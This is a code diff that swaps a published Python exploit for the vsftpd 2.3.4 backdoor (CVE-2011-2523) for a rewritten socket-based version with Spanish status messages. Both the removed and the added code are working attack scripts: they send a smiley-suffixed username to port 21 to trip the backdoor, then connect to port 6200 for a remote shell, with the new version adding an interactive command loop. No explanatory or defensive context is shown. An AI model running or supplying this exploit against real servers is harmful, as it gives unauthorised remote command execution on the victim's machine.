@@ -1,40 +1,27 @@
-# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
-# Date: 9-04-2021
-# Exploit Author: HerculesRD
-# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
-# Version: vsftpd 2.3.4
-# Tested on: debian
-# CVE : CVE-2011-2523
+import socket
+import sys
+import time
 
-#!/usr/bin/python3
+target = sys.argv[1]
 
-from telnetlib import Telnet
-import argparse
-from signal import signal, SIGINT
-from sys import exit
+print(f"[*] Conectando a {target}:21 para activar backdoor...")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, 21))
+s.recv(1024) # Recibir banner
+s.send(b"USER root:)\r\n")
+s.send(b"PASS x\r\n")
+s.close()
 
-def handler(signal_received, frame):
-    # Handle any cleanup here
-    print('   [+]Exiting...')
-    exit(0)
+print("[*] Backdoor activado. Conectando a la shell en puerto 6200...")
+time.sleep(1)
 
-signal(SIGINT, handler)
-parser=argparse.ArgumentParser()
-parser.add_argument("host", help="input the address of the vulnerable host", type=str)
-args = parser.parse_args()
-host = args.host
-portFTP = 21 #if necessary edit this line
-
-user="USER nergal:)"
-password="PASS pass"
-
-tn=Telnet(host, portFTP)
-tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
-tn.write(user.encode('ascii') + b"\n")
-tn.read_until(b"password.") #if necessary, edit this line
-tn.write(password.encode('ascii') + b"\n")
-
-tn2=Telnet(host, 6200)
-print('Success, shell opened')
-print('Send `exit` to quit shell')
-tn2.interact()
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    s2.connect((target, 6200))
+    print("[+] ¡Shell obtenida! Escribe comandos (ej: whoami)")
+    while True:
+        cmd = input("# ")
+        s2.send(cmd.encode() + b"\n")
+        print(s2.recv(4096).decode(), end="")
+except ConnectionRefusedError:
+    print("[-] Error: No se pudo conectar al puerto 6200. El backdoor no está activo o está bloqueado.")
